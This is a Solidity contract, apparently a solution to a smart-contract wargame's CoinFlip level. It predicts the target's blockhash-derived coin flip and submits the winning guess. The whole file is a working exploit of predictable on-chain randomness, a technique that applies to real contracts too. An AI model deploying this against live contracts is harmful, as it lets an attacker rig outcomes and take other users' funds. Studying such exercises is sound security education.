pragma solidity ^0.6.0;

import './helpers/SafeMath.sol';

interface CoinFlip {
   function flip(bool _guess) external returns (bool);
}

contract CoinFlipHacked {

  using SafeMath for uint256;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function flipHack(address _instance) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    CoinFlip(_instance).flip(side);
  }
}